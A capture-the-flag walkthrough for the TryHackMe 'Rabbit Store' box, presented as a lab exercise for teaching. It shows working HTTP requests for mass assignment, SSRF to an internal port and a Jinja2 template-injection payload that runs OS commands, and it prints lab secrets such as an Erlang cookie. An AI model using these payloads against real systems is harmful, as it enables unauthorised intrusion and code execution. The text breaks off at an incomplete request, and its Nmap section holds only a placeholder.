---
title: "Rabbit Store"
type: docs
tags:
  - thm
  - linux
  - medium
  - jwt
  - mass-assignment
  - ssrf
  - ssti
  - jinja2
  - rabbitmq
---

<div class="callout callout-info">

**Box Info**

**Platform:** TryHackMe, **OS:** Linux, **Difficulty:** Medium, **Host:** `cloudsite.thm` (+ `storage.cloudsite.thm`)

</div>

<div class="callout callout-abstract">

**Attack Path**

1. `storage.cloudsite.thm/api`, register issues a JWT with `subscription:inactive`. **Mass assignment**: add `"subscription":"active"` to the register body → active account.
2. API map: `/api/upload`, `/api/store-url`, **`/api/fetch_messeges_from_chatbot`** (takes a `url`). It's an **SSRF** → hit `http://127.0.0.1:3000/api/docs` (internal API).
3. The internal API on `:3000` renders a template with user input → **Jinja2 SSTI** → RCE.
4. Write an SSH key into a user's `~/.ssh/authorized_keys` via the RCE → SSH.
5. Root: **RabbitMQ**, `/var/lib/rabbitmq/.erlang.cookie` = `gdkGFHW4NuwcsFc9`. Use it with `rabbitmqctl` / an Erlang remote shell (or decode a stored user's hash) to escalate.

</div>

<div class="callout callout-key">

**Loot**

- RabbitMQ Erlang cookie: `gdkGFHW4NuwcsFc9`

</div>

---

## Full Walkthrough

### Nmap Scan

```bash
test
```


### Enumeration

when visiting the IP address in my browser It had given me a redirect for a domain `cloudsite.thm` which I then added to my `/etc/hosts` file. Before I dive too deep into the website I am going to do basic enumeration what is the application running, possible subdomains, other basic factors to understand the extend of this application.

#### FFuf enumeration

I was able to identify `storage` as a subdomain for the web application.

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.cloudsite.thm" -u http://cloudsite.thm/ --fc 302

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cloudsite.thm/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.cloudsite.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 302
________________________________________________

storage                 [Status: 200, Size: 9039, Words: 3183, Lines: 263, Duration: 147ms]
```

![Pasted image 20250518152222](Pasted-image-20250518152222.png)

and now we are prompted with a login and I do not have any credentials. I looked into the source of the website and I found two interesting files `/login.js` and `/main.js`


### Login.js

```js
document.getElementById("loginForm").addEventListener("submit", async function(event) {
    event.preventDefault();
    
    // Clear any previous errors
    const errorDiv = document.querySelector(".loginError");
    errorDiv.innerHTML = "";
    
    const formData = {
        email: this.elements.email.value,
        password: this.elements.password.value
    };

    try {
        const response = await axios.post("/api/login", formData, {
            headers: {
                "Content-Type": "application/json"
            }
        });
        
        console.log(response.data);
        if(response.data === "inactive"){
            window.location.replace("/dashboard/inactive");
        }
        else if (response.data === "active"){
            window.location.replace("/dashboard/active");
        }
        this.reset();
    } catch (error) {
        // Add error message to the loginError div
        errorDiv.innerHTML = `Invalid Username or Password`;
    }
});
```

I then started fuzzing for endpoints in the API with `ffuf`.

```bash
└─[$] ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u "http://storage.cloudsite.thm/api/FUZZ"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://storage.cloudsite.thm/api/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

login                   [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 202ms]
register                [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 208ms]
uploads                 [Status: 401, Size: 32, Words: 3, Lines: 1, Duration: 92ms]
docs                    [Status: 403, Size: 27, Words: 2, Lines: 1, Duration: 88ms]
Login                   [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 87ms]
Register                [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 88ms]
Uploads                 [Status: 401, Size: 32, Words: 3, Lines: 1, Duration: 87ms]
Docs                    [Status: 403, Size: 27, Words: 2, Lines: 1, Duration: 89ms]
DOCS                    [Status: 403, Size: 27, Words: 2, Lines: 1, Duration: 153ms]
LogIn                   [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 86ms]
LOGIN                   [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 91ms]
```

Before I start manually testing these endpoints I am going to try to interact with the website first register for an account log all requests and responses and move forward from there.

#### Registeration request

```http
POST /api/register HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://storage.cloudsite.thm/register.html
Content-Type: application/json
Content-Length: 56
Origin: http://storage.cloudsite.thm
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Priority: u=0

{"email":"baphomet@cloudsite.thm","password":"baphomet"}
```

#### Login Request

```http
POST /api/login HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 56
Origin: http://storage.cloudsite.thm
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://storage.cloudsite.thm/
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImJhcGhvbWV0QGNsb3Vkc2l0ZS50aG0iLCJzdWJzY3JpcHRpb24iOiJpbmFjdGl2ZSIsImlhdCI6MTc0NzYwMjcwNywiZXhwIjoxNzQ3NjA2MzA3fQ.TApsWEdpcvSv_V5-0r-TNpEwel2rRESS824dZsotYQE
Priority: u=0

{"email":"baphomet@cloudsite.thm","password":"baphomet"}
```

one thing that I noticed that is quite interesting is that the application is utilizing Json Web tokens for authentication something to note for the future. 

#### Login Response

```http
HTTP/1.1 200 OK
Date: Sun, 18 May 2025 21:13:50 GMT
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 8
ETag: W/"8-1Daj9A4+zOiWAQvpnc8ApXe5Cao"
Set-Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImJhcGhvbWV0QGNsb3Vkc2l0ZS50aG0iLCJzdWJzY3JpcHRpb24iOiJpbmFjdGl2ZSIsImlhdCI6MTc0NzYwMjgzMCwiZXhwIjoxNzQ3NjA2NDMwfQ.Hz6APZsdm7NFdrBE4SmJmk5t5c4uXoKSaugphVpxluw; Max-Age=3600; Path=/; Expires=Sun, 18 May 2025 22:13:50 GMT; HttpOnly
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

inactive
```

then it redirects us to the following request and website endpoint.

```http
GET /dashboard/inactive HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://storage.cloudsite.thm/
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImJhcGhvbWV0QGNsb3Vkc2l0ZS50aG0iLCJzdWJzY3JpcHRpb24iOiJpbmFjdGl2ZSIsImlhdCI6MTc0NzYwMjgzMCwiZXhwIjoxNzQ3NjA2NDMwfQ.Hz6APZsdm7NFdrBE4SmJmk5t5c4uXoKSaugphVpxluw
Upgrade-Insecure-Requests: 1
If-Modified-Since: Thu, 15 Aug 2024 16:29:07 GMT
If-None-Match: W/"1da2-19156df18f8-gzip"
Priority: u=0, i
```

![Pasted image 20250518171458](Pasted-image-20250518171458.png)

hmmm maybe we can take a look to see what out `jwt` token has to offer. 

![Pasted image 20250518171548](Pasted-image-20250518171548.png)

perhaps we can edit our token to make it active. We could only do this if we had the secret which we dont tried cracking it using `hashcat` nothing. Looking back at the main website I have found some possible users.

![Pasted image 20250518173731](Pasted-image-20250518173731.png)

finally I tried adding a `subscription` parameter when registering and got a registeration true.

```http
POST /api/register HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://storage.cloudsite.thm/register.html
Content-Type: application/json
Content-Length: 58
Origin: http://storage.cloudsite.thm
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Priority: u=0

{"email":"baphomet1@cloudsite.thm","password":"baphomet1","subscription":"active"}
```

![Pasted image 20250518184205](Pasted-image-20250518184205.png)

now we have access!!

![Pasted image 20250518192044](Pasted-image-20250518192044.png)

```bash
└─[$] mv ~/Downloads/d4153de5-a9fa-4c1e-9bc2-cd266f591c3b .                                   [19:22:38]
┌─[anarchy@pwn] - [~/thm/boxes/RabbitStore] - [2778]
└─[$] cat d4153de5-a9fa-4c1e-9bc2-cd266f591c3b                                                [19:23:20]
Endpoints Perfectly Completed

POST Requests:
/api/register - For registering user
/api/login - For loggin in the user
/api/upload - For uploading files
/api/store-url - For uploadion files via url
/api/fetch_messeges_from_chatbot - Currently, the chatbot is under development. Once development is complete, it will be used in the future.

GET Requests:
/api/uploads/filename - To view the uploaded files
/dashboard/inactive - Dashboard for inactive user
/dashboard/active - Dashboard for active user

Note: All requests to this endpoint are sent in JSON format.
```

![Pasted image 20250518192337](Pasted-image-20250518192337.png)

![Pasted image 20250518192400](Pasted-image-20250518192400.png)

```http
POST /api/fetch_messeges_from_chatbot HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://storage.cloudsite.thm/dashboard/active
Content-Type: application/json
Content-Length: 40
Origin: http://storage.cloudsite.thm
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImJhcGhvbWV0MUBjbG91ZHNpdGUudGhtIiwic3Vic2NyaXB0aW9uIjoiYWN0aXZlIiwiaWF0IjoxNzQ3NjA4MTEwLCJleHAiOjE3NDc2MTE3MTB9.XTRwNFUw9aCuxwsejUTkhsD0c02Iu49qAvye8Y5uwoE
Priority: u=0

{"url":"http://127.0.0.1:3000/api/docs"}
```

```http
HTTP/1.1 200 OK
Date: Sun, 18 May 2025 23:23:50 GMT
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 48
ETag: W/"30-HRIDikR9Rsmd3ZTyOjz4OFirGCM"
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

{
  "error": "username parameter is required"
}
```


```http
POST /api/fetch_messeges_from_chatbot HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://storage.cloudsite.thm/dashboard/active
Content-Type: application/json
Content-Length: 24
Origin: http://storage.cloudsite.thm
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImJhcGhvbWV0MUBjbG91ZHNpdGUudGhtIiwic3Vic2NyaXB0aW9uIjoiYWN0aXZlIiwiaWF0IjoxNzQ3NjA4MTEwLCJleHAiOjE3NDc2MTE3MTB9.XTRwNFUw9aCuxwsejUTkhsD0c02Iu49qAvye8Y5uwoE
Priority: u=0

{"username":"baphomet1"}
```

```http
HTTP/1.1 200 OK
Date: Sun, 18 May 2025 23:24:23 GMT
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
ETag: W/"120-MLrrtS9dLl/FjKfv3RL/p3XjH00-gzip"
Vary: Accept-Encoding
Content-Length: 288
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

<!DOCTYPE html>
<html lang="en">
 <head>
   <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Greeting</title>
 </head>
 <body>
   <h1>Sorry, baphomet1, our chatbot server is currently under development.</h1>
 </body>
</html>
```

I wanted to test for errors ot possible templates so I did the following

```http
POST /api/fetch_messeges_from_chatbot HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://storage.cloudsite.thm/dashboard/active
Content-Type: application/json
Content-Length: 31
Origin: http://storage.cloudsite.thm
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImJhcGhvbWV0MUBjbG91ZHNpdGUudGhtIiwic3Vic2NyaXB0aW9uIjoiYWN0aXZlIiwiaWF0IjoxNzQ3NjA4MTEwLCJleHAiOjE3NDc2MTE3MTB9.XTRwNFUw9aCuxwsejUTkhsD0c02Iu49qAvye8Y5uwoE
Priority: u=0

{"username":"$&#123;&#123;<%[%'\"}}%\\."}
```

```http
HTTP/1.1 200 OK
Date: Sun, 18 May 2025 23:25:11 GMT
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
ETag: W/"4f34-xRjUFjWbh3xTVbmHEUdUoQFlVic-gzip"
Vary: Accept-Encoding
Content-Length: 20276
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

<!doctype html>
<html lang=en>
  <head>
    <title>jinja2.exceptions.TemplateSyntaxError: unexpected '<'
 // Werkzeug Debugger</title>
    <link rel="stylesheet" href="?__debugger__=yes&cmd=resource&f=style.css">
    <link rel="shortcut icon"
        href="?__debugger__=yes&cmd=resource&f=console.png">
    <script src="?__debugger__=yes&cmd=resource&f=debugger.js"></script>
    <script>
      var CONSOLE_MODE = false,
          EVALEX = true,
          EVALEX_TRUSTED = false,
          SECRET = "45U9qH2rEoaBLhaBEomB";
    </script>
  </head>
  <body style="background-color: #fff">
    
<h1>TemplateSyntaxError</h1>

  jinja2.exceptions.TemplateSyntaxError: unexpected '<'


<h2 class="traceback">Traceback (most recent call last)</h2>

  <h3></h3>
  <ul><li>
  <h4>File <cite class="filename">"/home/azrael/.local/lib/python3.10/site-packages/flask/app.py"</cite>,
      line 1498,
      in <code class="function">__call__</code></h4>
  <pre class="line before">    ) -> cabc.Iterable[bytes]:</pre>
<pre class="line before">        """The WSGI server calls the Flask application object as the</pre>
<pre class="line before">        WSGI application. This calls :meth:`wsgi_app`, which can be</pre>
<pre class="line before">        wrapped to apply middleware.</pre>
<pre class="line before">        """</pre>
<pre class="line current">        return self.wsgi_app(environ, start_response)</pre>


<li>
  <h4>File <cite class="filename">"/home/azrael/.local/lib/python3.10/site-packages/flask/app.py"</cite>,
      line 1476,
      in <code class="function">wsgi_app</code></h4>
  <pre class="line before">            try:</pre>
<pre class="line before">                ctx.push()</pre>
<pre class="line before">                response = self.full_dispatch_request()</pre>
<pre class="line before">            except Exception as e:</pre>
<pre class="line before">                error = e</pre>
<pre class="line current">                response = self.handle_exception(e)</pre>
<pre class="line after">            except:  # noqa: B001</pre>
<pre class="line after">                error = sys.exc_info()[1]</pre>
<pre class="line after">                raise</pre>
<pre class="line after">            return response(environ, start_response)</pre>
<pre class="line after">        finally:</pre>


<li>
  <h4>File <cite class="filename">"/home/azrael/.local/lib/python3.10/site-packages/flask/app.py"</cite>,
      line 1473,
      in <code class="function">wsgi_app</code></h4>
  <pre class="line before">        ctx = self.request_context(environ)</pre>
<pre class="line before">        error: BaseException | None = None</pre>
<pre class="line before">        try:</pre>
<pre class="line before">            try:</pre>
<pre class="line before">                ctx.push()</pre>
<pre class="line current">                response = self.full_dispatch_request()</pre>
<pre class="line after">            except Exception as e:</pre>
<pre class="line after">                error = e</pre>
<pre class="line after">                response = self.handle_exception(e)</pre>
<pre class="line after">            except:  # noqa: B001</pre>
<pre class="line after">                error = sys.exc_info()[1]</pre>


<li>
  <h4>File <cite class="filename">"/home/azrael/.local/lib/python3.10/site-packages/flask/app.py"</cite>,
      line 882,
      in <code class="function">full_dispatch_request</code></h4>
  <pre class="line before">            request_started.send(self, _async_wrapper=self.ensure_sync)</pre>
<pre class="line before">            rv = self.preprocess_request()</pre>
<pre class="line before">            if rv is None:</pre>
<pre class="line before">                rv = self.dispatch_request()</pre>
<pre class="line before">        except Exception as e:</pre>
<pre class="line current">            rv = self.handle_user_exception(e)</pre>
<pre class="line after">        return self.finalize_request(rv)</pre>
<pre class="line after"> </pre>
<pre class="line after">    def finalize_request(</pre>
<pre class="line after">        self,</pre>
<pre class="line after">        rv: ft.ResponseReturnValue | HTTPException,</pre>


<li>
  <h4>File <cite class="filename">"/home/azrael/.local/lib/python3.10/site-packages/flask/app.py"</cite>,
      line 880,
      in <code class="function">full_dispatch_request</code></h4>
  <pre class="line before"> </pre>
<pre class="line before">        try:</pre>
<pre class="line before">            request_started.send(self, _async_wrapper=self.ensure_sync)</pre>
<pre class="line before">            rv = self.preprocess_request()</pre>
<pre class="line before">            if rv is None:</pre>
<pre class="line current">                rv = self.dispatch_request()</pre>
<pre class="line after">        except Exception as e:</pre>
<pre class="line after">            rv = self.handle_user_exception(e)</pre>
<pre class="line after">        return self.finalize_request(rv)</pre>
<pre class="line after"> </pre>
<pre class="line after">    def finalize_request(</pre>


<li>
  <h4>File <cite class="filename">"/home/azrael/.local/lib/python3.10/site-packages/flask/app.py"</cite>,
      line 865,
      in <code class="function">dispatch_request</code></h4>
  <pre class="line before">            and req.method == "OPTIONS"</pre>
<pre class="line before">        ):</pre>
<pre class="line before">            return self.make_default_options_response()</pre>
<pre class="line before">        # otherwise dispatch to the handler for that endpoint</pre>
<pre class="line before">        view_args: dict[str, t.Any] = req.view_args  # type: ignore[assignment]</pre>
<pre class="line current">        return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]</pre>
<pre class="line after"> </pre>
<pre class="line after">    def full_dispatch_request(self) -> Response:</pre>
<pre class="line after">        """Dispatches the request and on top of that performs request</pre>
<pre class="line after">        pre and postprocessing as well as HTTP exception catching and</pre>
<pre class="line after">        error handling.</pre>


<li>
  <h4>File <cite class="filename">"/home/azrael/chatbotServer/chatbot.py"</cite>,
      line 24,
      in <code class="function">index</code></h4>
  <pre class="line before"> <body></pre>
<pre class="line before">   <h1>Sorry, {}, our chatbot server is currently under development.</h1></pre>
<pre class="line before"> </body></pre>
<pre class="line before"></html>'''.format(username)</pre>
<pre class="line before"> </pre>
<pre class="line current">    return render_template_string(template)</pre>
<pre class="line after"> </pre>
<pre class="line after">if __name__ == '__main__':</pre>
<pre class="line after">    app.run(debug=True, port=8000)</pre>


<li>
  <h4>File <cite class="filename">"/home/azrael/.local/lib/python3.10/site-packages/flask/templating.py"</cite>,
      line 161,
      in <code class="function">render_template_string</code></h4>
  <pre class="line before"> </pre>
<pre class="line before">    :param source: The source code of the template to render.</pre>
<pre class="line before">    :param context: The variables to make available in the template.</pre>
<pre class="line before">    """</pre>
<pre class="line before">    app = current_app._get_current_object()  # type: ignore[attr-defined]</pre>
<pre class="line current">    template = app.jinja_env.from_string(source)</pre>
<pre class="line after">    return _render(app, template, context)</pre>
<pre class="line after"> </pre>
<pre class="line after"> </pre>
<pre class="line after">def _stream(</pre>
<pre class="line after">    app: Flask, template: Template, context: dict[str, t.Any]</pre>


<li>
  <h4>File <cite class="filename">"/home/azrael/.local/lib/python3.10/site-packages/jinja2/environment.py"</cite>,
      line 1108,
      in <code class="function">from_string</code></h4>
  <pre class="line before">        :param template_class: Return an instance of this</pre>
<pre class="line before">            :class:`Template` class.</pre>
<pre class="line before">        """</pre>
<pre class="line before">        gs = self.make_globals(globals)</pre>
<pre class="line before">        cls = template_class or self.template_class</pre>
<pre class="line current">        return cls.from_code(self, self.compile(source), gs, None)</pre>
<pre class="line after"> </pre>
<pre class="line after">    def make_globals(</pre>
<pre class="line after">        self, d: t.Optional[t.MutableMapping[str, t.Any]]</pre>
<pre class="line after">    ) -> t.MutableMapping[str, t.Any]:</pre>
<pre class="line after">        """Make the globals map for a template. Any given template</pre>


<li>
  <h4>File <cite class="filename">"/home/azrael/.local/lib/python3.10/site-packages/jinja2/environment.py"</cite>,
      line 768,
      in <code class="function">compile</code></h4>
  <pre class="line before">                return source</pre>
<pre class="line before">            if filename is None:</pre>
<pre class="line before">                filename = "<template>"</pre>
<pre class="line before">            return self._compile(source, filename)</pre>
<pre class="line before">        except TemplateSyntaxError:</pre>
<pre class="line current">            self.handle_exception(source=source_hint)</pre>
<pre class="line after"> </pre>
<pre class="line after">    def compile_expression(</pre>
<pre class="line after">        self, source: str, undefined_to_none: bool = True</pre>
<pre class="line after">    ) -> "TemplateExpression":</pre>
<pre class="line after">        """A handy helper method that returns a callable that accepts keyword</pre>


<li>
  <h4>File <cite class="filename">"/home/azrael/.local/lib/python3.10/site-packages/jinja2/environment.py"</cite>,
      line 939,
      in <code class="function">handle_exception</code></h4>
  <pre class="line before">        """Exception handling helper.  This is used internally to either raise</pre>
<pre class="line before">        rewritten exceptions or return a rendered traceback for the template.</pre>
<pre class="line before">        """</pre>
<pre class="line before">        from .debug import rewrite_traceback_stack</pre>
<pre class="line before"> </pre>
<pre class="line current">        raise rewrite_traceback_stack(source=source)</pre>
<pre class="line after"> </pre>
<pre class="line after">    def join_path(self, template: str, parent: str) -> str:</pre>
<pre class="line after">        """Join a template with the parent.  By default all the lookups are</pre>
<pre class="line after">        relative to the loader root so this method returns the `template`</pre>
<pre class="line after">        parameter unchanged, but if the paths should be relative to the</pre>


<li>
  <h4>File <cite class="filename">"<unknown>"</cite>,
      line 9,
      in <code class="function">template</code></h4>
  

</ul>
  <blockquote>jinja2.exceptions.TemplateSyntaxError: unexpected '<'
</blockquote>


    
      This is the Copy/Paste friendly version of the traceback.
    
    <textarea cols="50" rows="10" name="code" readonly>Traceback (most recent call last):
  File "/home/azrael/.local/lib/python3.10/site-packages/flask/app.py", line 1498, in __call__
    return self.wsgi_app(environ, start_response)
  File "/home/azrael/.local/lib/python3.10/site-packages/flask/app.py", line 1476, in wsgi_app
    response = self.handle_exception(e)
  File "/home/azrael/.local/lib/python3.10/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/azrael/.local/lib/python3.10/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/azrael/.local/lib/python3.10/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/azrael/.local/lib/python3.10/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "/home/azrael/chatbotServer/chatbot.py", line 24, in index
    return render_template_string(template)
  File "/home/azrael/.local/lib/python3.10/site-packages/flask/templating.py", line 161, in render_template_string
    template = app.jinja_env.from_string(source)
  File "/home/azrael/.local/lib/python3.10/site-packages/jinja2/environment.py", line 1108, in from_string
    return cls.from_code(self, self.compile(source), gs, None)
  File "/home/azrael/.local/lib/python3.10/site-packages/jinja2/environment.py", line 768, in compile
    self.handle_exception(source=source_hint)
  File "/home/azrael/.local/lib/python3.10/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "<unknown>", line 9, in template
jinja2.exceptions.TemplateSyntaxError: unexpected '<'
</textarea>


  The debugger caught an exception in your WSGI application.  You can now
  look at the traceback which led to the error.  
  If you enable JavaScript you can also use additional features such as code
  execution (if the evalex feature is enabled), automatic pasting of the
  exceptions and much more.

      
        Brought to you by DON'T PANIC, your
        friendly Werkzeug powered traceback interpreter.
      
    

    
      
        <h3>Console Locked</h3>
        
          The console is locked and needs to be unlocked by entering the PIN.
          You can find the PIN printed out on the standard output of your
          shell that runs the server.
        <form>
          PIN:
            <input type=text name=pin size=14>
            <input type=submit name=btn value="Confirm Pin">
        </form>
      
    
  </body>
</html>

<!--

Traceback (most recent call last):
  File "/home/azrael/.local/lib/python3.10/site-packages/flask/app.py", line 1498, in __call__
    return self.wsgi_app(environ, start_response)
  File "/home/azrael/.local/lib/python3.10/site-packages/flask/app.py", line 1476, in wsgi_app
    response = self.handle_exception(e)
  File "/home/azrael/.local/lib/python3.10/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/azrael/.local/lib/python3.10/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/azrael/.local/lib/python3.10/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/azrael/.local/lib/python3.10/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "/home/azrael/chatbotServer/chatbot.py", line 24, in index
    return render_template_string(template)
  File "/home/azrael/.local/lib/python3.10/site-packages/flask/templating.py", line 161, in render_template_string
    template = app.jinja_env.from_string(source)
  File "/home/azrael/.local/lib/python3.10/site-packages/jinja2/environment.py", line 1108, in from_string
    return cls.from_code(self, self.compile(source), gs, None)
  File "/home/azrael/.local/lib/python3.10/site-packages/jinja2/environment.py", line 768, in compile
    self.handle_exception(source=source_hint)
  File "/home/azrael/.local/lib/python3.10/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "<unknown>", line 9, in template
jinja2.exceptions.TemplateSyntaxError: unexpected '<'


-->
```


now that we know it is running `jinja2` we can do some template injection to get RCE

#### RCE

```http
POST /api/fetch_messeges_from_chatbot HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://storage.cloudsite.thm/dashboard/active
Content-Type: application/json
Content-Length: 95
Origin: http://storage.cloudsite.thm
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImJhcGhvbWV0MUBjbG91ZHNpdGUudGhtIiwic3Vic2NyaXB0aW9uIjoiYWN0aXZlIiwiaWF0IjoxNzQ3NjA4MTEwLCJleHAiOjE3NDc2MTE3MTB9.XTRwNFUw9aCuxwsejUTkhsD0c02Iu49qAvye8Y5uwoE
Priority: u=0

{"username":"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"}
```

```http
HTTP/1.1 200 OK
Date: Sun, 18 May 2025 23:27:02 GMT
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
ETag: W/"14d-ojYn6THt7bzf2bPnsR3mx4TyLQs-gzip"
Vary: Accept-Encoding
Content-Length: 333
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

<!DOCTYPE html>
<html lang="en">
 <head>
   <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Greeting</title>
 </head>
 <body>
   <h1>Sorry, uid=1000(azrael) gid=1000(azrael) groups=1000(azrael)
, our chatbot server is currently under development.</h1>
 </body>
</html>
```

I made ssh keys in my directory downloaded it into the user directory to ssh.

```http
POST /api/fetch_messeges_from_chatbot HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://storage.cloudsite.thm/dashboard/active
Content-Type: application/json
Content-Length: 163
Origin: http://storage.cloudsite.thm
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImJhcGhvbWV0MUBjbG91ZHNpdGUudGhtIiwic3Vic2NyaXB0aW9uIjoiYWN0aXZlIiwiaWF0IjoxNzQ3NjA4MTEwLCJleHAiOjE3NDc2MTE3MTB9.XTRwNFUw9aCuxwsejUTkhsD0c02Iu49qAvye8Y5uwoE
Priority: u=0

